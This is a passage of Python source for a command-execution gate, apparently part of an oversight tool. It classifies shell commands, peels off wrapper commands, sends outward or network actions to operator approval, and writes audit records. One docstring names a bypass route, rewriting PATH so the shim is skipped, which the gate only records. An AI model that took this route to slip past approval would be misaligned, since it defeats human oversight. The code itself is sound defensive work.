    ``None`` with no ambiguity means the wrapper was invoked without a payload
    (``sudo -v``, a bare ``env``), which is the wrapper's own local behaviour.
    """
    index = 0
    positionals = list(spec.positionals)
    terminated = False
    while index < len(args):
        token = args[index]
        if not terminated:
            if token == "--":
                terminated = True
                index += 1
                continue
            if token.startswith("-") and token != "-":
                ambiguity, takes_next = _consume_flag(token, spec)
                if ambiguity:
                    return None, ambiguity
                index += 2 if takes_next else 1
                if takes_next and index > len(args):
                    return None, f"{token} is missing its value"
                continue
            if spec.env_assignments and _ENV_ASSIGNMENT.match(token):
                index += 1
                continue
        if positionals:
            kind = positionals.pop(0)
            if not _POSITIONAL_VALIDATORS[kind](token):
                return None, f"{token!r} is not a valid {kind}"
            index += 1
            continue
        return index, ""
    if positionals:
        return None, f"missing {positionals[0]}"
    return None, ""


def _unwrap(name: str, args: list[str]) -> _Unwrapped:
    """Peel wrapper commands until the real command is on top.

    A wrapper's flags may take values, and those values can themselves be
    command names, so neither "the first non-flag token" nor "the first token
    that names a known command" is a safe answer. Each wrapper is parsed with
    its own flag grammar (value-taking flags, ``--flag=value``, ``--``,
    clustered shorts, ``NAME=VALUE`` assignments, leading positionals) and the
    payload is the first token that is none of those. Anything the grammar
    cannot account for - an unknown flag, an optional-argument flag, a
    ``NAME=VALUE``-only invocation of a wrapper that does not take them, a
    payload we do not recognise - is ambiguous, and ambiguity gates.
    """
    for _ in range(_MAX_UNWRAP):
        spec = _WRAPPER_SPECS.get(name)
        if spec is None:
            return _Unwrapped(name, args)
        index, ambiguity = _wrapper_payload_index(spec, args)
        if ambiguity:
            return _Unwrapped(name, args, f"{name}: {ambiguity}")
        if index is None:
            # No wrapped command at all: the wrapper is the command.
            return _Unwrapped(name, args)
        payload = binary_name(args[index])
        if payload not in _KNOWN_COMMANDS:
            return _Unwrapped(name, args, f"{name}: unrecognised payload {payload!r}")
        name, args = payload, args[index + 1 :]
    return _Unwrapped(name, args, "wrapper nesting is too deep to resolve")


def classify(binary: str, args: list[str]) -> Decision:
    """Classify a command as outward (gate) or local (allow).

    Over-gates on ambiguity (safe asymmetry - the operator just approves). In
    ``BRAINS_GATE_MODE=strict`` an unknown binary is gated rather than allowed.

    The summary carried on the decision is built from the *normalised* argument
    vector, so a secret passed on the command line does not travel into the
    audit payload, the approval body, or a bridge notification.
    """
    args = [str(a) for a in args]
    raw_name = binary_name(binary)
    joined = " ".join([raw_name, *normalize_args(args, raw_name)])
    unwrapped = _unwrap(raw_name, args)
    if unwrapped.ambiguity:
        return Decision(
            True,
            f"{raw_name} (unresolved wrapper)",
            joined,
            "a wrapper whose payload could not be identified is gated, not guessed "
            f"({unwrapped.ambiguity})",
        )
    name, effective_args = unwrapped.name, unwrapped.args
    label = name if name == raw_name else f"{raw_name} -> {name}"
    strict = _gate_mode() == "strict"
    arg_tokens = {a.lower() for a in effective_args}

    if name in _REMOTE_RUNNERS:
        return Decision(True, f"{name} (remote runner)", joined, "fetches and runs remote code")

    if name in _SHELLS or name in _INTERPRETERS:
        code = _inline_code(name, effective_args)
        if code is not None:
            if strict:
                return Decision(
                    True,
                    f"{name} -c (inline/strict)",
                    joined,
                    "inline code is not parseable; strict mode gates it",
                )
            hit = _scan_inline(code)
            if hit:
                return Decision(
                    True,
                    f"{name} -c ({hit})",
                    joined,
                    f"inline code references the outward token {hit!r}",
                )
        if name in _INTERPRETERS and "-m" in effective_args:
            index = effective_args.index("-m")
            if index + 1 < len(effective_args):
                inner = classify(effective_args[index + 1], effective_args[index + 2 :])
                if inner.gate:
                    return Decision(
                        True,
                        f"{name} -m {inner.action_type}",
                        joined,
                        inner.reason or "module run resolves to an outward command",
                    )

    if name in _ALWAYS_GATE:
        return Decision(True, name, joined, "outward by nature")

    if name in _SUBCOMMAND_GATE:
        subs = _SUBCOMMAND_GATE[name]
        if subs is None:
            return Decision(True, name, joined, "every invocation may mutate remote state")
        # Match the gated subcommand as a token ANYWHERE in args.
        hit = next((s for s in subs if s in arg_tokens), None)
        if hit:
            return Decision(True, f"{name} {hit}", joined, "outward subcommand")
        return Decision(False, label, joined)

    if name in _NET_FETCHERS:
        remote = _remote_target(name, effective_args)
        if remote is None:
            return Decision(False, f"{name} (local)", joined)
        return Decision(
            True, f"{name} (network)", joined, f"non-loopback network target {remote!r}"
        )

    if strict and name not in _LOCAL_ALLOW:
        return Decision(True, f"{name} (unknown/strict)", joined, "not on the strict allowlist")

    # Default: local / read+propose -> allow.
    return Decision(False, label, joined)


# --- approval flow --------------------------------------------------------

#: Set on the child environment so a shim that somehow re-enters the gate is
#: refused instead of recursing forever.
GATE_DEPTH_ENV = "BRAINS_GATE_DEPTH"
_MAX_GATE_DEPTH = 3


def _shim_dir() -> str:
    return os.environ.get("BRAINS_GATE_SHIM_DIR", "")


def _same_path(left: str, right: str) -> bool:
    if not left or not right:
        return False
    try:
        return os.path.normcase(os.path.realpath(left)) == os.path.normcase(os.path.realpath(right))
    except OSError:
        return os.path.normcase(left) == os.path.normcase(right)


def _path_extensions() -> list[str]:
    """Extensions ``PATH`` lookup appends on this host, empty string first.

    On Windows a bare ``git`` resolves through ``PATHEXT``; on POSIX it does
    not. Resolution checks the bare name on both so a POSIX-style wrapper is
    still found when a suite runs on Windows.
    """
    extensions = [""]
    if os.name == "nt":
        extensions.extend(
            ext.lower()
            for ext in os.environ.get("PATHEXT", ".COM;.EXE;.BAT;.CMD").split(os.pathsep)
            if ext
        )
    return extensions


def resolve_executable(name: str, *, exclude_dir: str | None = None) -> str | None:
    """Resolve ``name`` on ``PATH``, never inside ``exclude_dir``.

    Used both to find the real binary behind a shim (where resolving back into
    the shim directory would loop forever) and to decide whether a binary is
    present enough to be worth shimming.
    """
    if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
        return name if os.path.isfile(name) else shutil.which(name)
    entries = [
        entry
        for entry in os.environ.get("PATH", "").split(os.pathsep)
        if entry and not (exclude_dir and _same_path(entry, exclude_dir))
    ]
    for entry in entries:
        for extension in _path_extensions():
            candidate = os.path.join(entry, f"{name}{extension}")
            if os.path.isfile(candidate) and (os.name == "nt" or os.access(candidate, os.X_OK)):
                return candidate
    if exclude_dir:
        return None
    return shutil.which(name)


def _real_binary(name: str) -> str | None:
    """Resolve the real binary, never resolving back into the brains shim dir.

    A shim that resolved to itself would loop forever, so the shim directory is
    excluded from the search entirely rather than merely deprioritised.
    """
    shim_dir = _shim_dir()
    if not shim_dir:
        return resolve_executable(name)
    return resolve_executable(name, exclude_dir=shim_dir)


def _shim_dir_on_path() -> bool:
    shim_dir = _shim_dir()
    if not shim_dir:
        return True
    return any(
        _same_path(entry, shim_dir)
        for entry in os.environ.get("PATH", "").split(os.pathsep)
        if entry
    )


def _workspace_id(workspace_path: str) -> int | None:
    try:
        from brains.control.sessions import register_workspace

        return register_workspace(workspace_path).id
    except Exception:  # noqa: BLE001 - attribution only; never authorises anything
        return None


def build_request(binary: str, args: list[str], decision: Decision) -> GovernedRequest:
    """Map a classified command onto the canonical governed-action request."""
    workspace = os.environ.get("BRAINS_GATE_WORKSPACE", os.getcwd())
    return GovernedRequest(
        actor=os.environ.get("BRAINS_OPERATOR", "exec-gate"),
        action="exec.command",
        tool=binary_name(binary),
        args=args,
        target=ActionTarget(
            workspace_id=_workspace_id(workspace),
            session_id=os.environ.get("BRAINS_GATE_SESSION") or None,
            workspace_path=workspace,
        ),
        tier=decision.tier,
        summary=decision.summary[:500],
        cwd=os.getcwd(),
    )


def _deny(message: str) -> int:
    sys.stderr.write(f"\033[31m[brains gate] DENIED: {message}\033[0m\n")
    sys.stderr.flush()
    return 13


def _observe_path_mutation(request: GovernedRequest) -> None:
    """Record that the shim directory is no longer on ``PATH``.

    Observational, not enforcement: we are already inside the gate, so this
    invocation is governed either way. It exists so an operator can see that
    something rewrote ``PATH``, which is the shape of a bypass attempt the
    cooperative boundary cannot itself prevent.
    """
    from brains.audit import record

    record(
        actor=request.actor,
        action="gate.path_mutation",
        payload={
            "tool": request.tool,
            "shim_dir": _shim_dir(),
            "cwd": request.cwd,
            "session_id": request.target.session_id,
        },
        workspace_id=request.target.workspace_id,
    )


def _handoff_replaces_process() -> bool:
    """Whether releasing the command replaces this process.

    POSIX hands off with ``os.execv``, which never returns, so nothing here can
    observe the outcome. Windows keeps the real binary as a child so the caller
    still gets its exit code. The two produce different (both truthful) records,
    and this predicate is what selects between them - on either host.
    """
    return os.name != "nt"


def gate_main(argv: list[str]) -> int:
    """Entry point a shim calls as ``python -m brains.exec.gate <binary> [args...]``.

    Classifies the command, routes it through :mod:`brains.govern`, and either
    execs the real binary or exits non-zero. A decision that cannot be recorded
    is a denial.
    """
    if len(argv) < 1:
        sys.stderr.write("brains gate: no command\n")
        return 2
    binary, args = argv[0], argv[1:]

    try:
        depth = int(os.environ.get(GATE_DEPTH_ENV, "0"))
    except ValueError:
        depth = 0
    if depth >= _MAX_GATE_DEPTH:
        return _deny(f"gate re-entered {depth} times for {binary!r} (shim recursion)")

    real = _real_binary(binary_name(binary))
    if real is None:
        sys.stderr.write(f"brains gate: cannot resolve real binary for {binary!r}\n")
        return 127

    decision = classify(binary, args)
    request = build_request(binary, args, decision)

    from brains.audit import AuditWriteError
    from brains.govern import authorize

    if not _shim_dir_on_path():
        _observe_path_mutation(request)

    try:
        authorization = authorize(request, poll_seconds=2.0)
    except AuditWriteError as exc:
        return _deny(f"{decision.action_type} could not be recorded ({exc})")
    except Exception as exc:  # noqa: BLE001 - any governance failure is a denial
        return _deny(f"{decision.action_type} could not be authorised ({exc})")

    if not authorization.allowed:
        return _deny(f"{decision.action_type} ({authorization.reason or 'rejected'})")

    return _run_released(request, authorization.action_id, decision, real, args, depth)


def _run_released(
    request: GovernedRequest,
    action_id: str,
    decision: Decision,
    real: str,
    args: list[str],
    depth: int,
) -> int:
    """Run the authorised command and record what this process can observe.

    Both tiers take the same governed lifecycle - an authorised action is
    marked executing before the effect and settled after it - because a local
    command that stopped at ``authorized`` was indistinguishable from one that
    never ran, and the stale sweep eventually recorded it as "abandoned before
    any effect" even though it had run to completion.

    What "settled" means differs by platform, and the difference is recorded
    rather than smoothed over:

    * **Windows** runs the real binary as a child, so the exit status is
      observable and is recorded as the actual outcome. That wait has no upper
      bound - it is the operator's own tool running - so the action holds an
      execution lease while the child runs and the stale sweep sees a live
      execution rather than an abandoned one.
    * **POSIX** replaces this process with the real binary, so there is no
      later instruction to report from. The handoff is recorded before the
      replacement as :data:`~brains.govern.STATUS_RELEASED` - the
      authorisation was spent and the binary took over here - which claims
      neither that it succeeded nor that it was abandoned. If ``execv`` itself
      fails, this process is still here, and that failure *is* recorded.
    """
    from brains.govern import complete, execution_lease, mark_executing, release_for_handoff

    try:
        attempt = mark_executing(request, action_id)
    except Exception as exc:  # noqa: BLE001 - an unrecorded release is a denial
        return _deny(f"{decision.action_type} release could not be recorded ({exc})")
    if decision.gate:
        sys.stderr.write(f"\033[32m[brains gate] approved: {decision.action_type}\033[0m\n")
        sys.stderr.flush()

    if not _handoff_replaces_process():
        # ``os.execv`` on Windows detaches the child from the console's process
        # tree, which loses the exit code the caller is waiting for. Running it
        # as a child is also what makes the outcome observable from here.
        child_env = dict(os.environ)
        child_env[GATE_DEPTH_ENV] = str(depth + 1)
        with execution_lease(action_id, attempt):
            completed = subprocess.run([real, *args], env=child_env, check=False)  # noqa: S603
        ok = completed.returncode == 0
        try:
            complete(
                request,
                action_id,
                ok=ok,
                result=f"exit {completed.returncode}",
                error=None if ok else f"{request.tool} exited {completed.returncode}",
            )
        except Exception as exc:  # noqa: BLE001 - the effect already happened
            # Denying now would be a lie: the command ran. Report the gap on
            # stderr instead of reversing an outcome that already occurred.
            sys.stderr.write(f"brains gate: outcome could not be recorded ({exc})\n")
        return completed.returncode

    os.environ[GATE_DEPTH_ENV] = str(depth + 1)
    try:
        release_for_handoff(request, action_id, handoff="execv")
    except Exception as exc:  # noqa: BLE001 - an unrecorded release is a denial
        return _deny(f"{decision.action_type} handoff could not be recorded ({exc})")
    try:
        os.execv(real, [real, *args])  # replace process with the real binary
    except OSError as exc:
        # The replacement never happened, so the released record is wrong and
        # this process is still here to correct it.
        with contextlib.suppress(Exception):
            complete(request, action_id, ok=False, error=f"execv failed: {exc}")
        return _deny(f"{decision.action_type} could not be started ({exc})")
    return 0  # unreachable


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(gate_main(sys.argv[1:]))
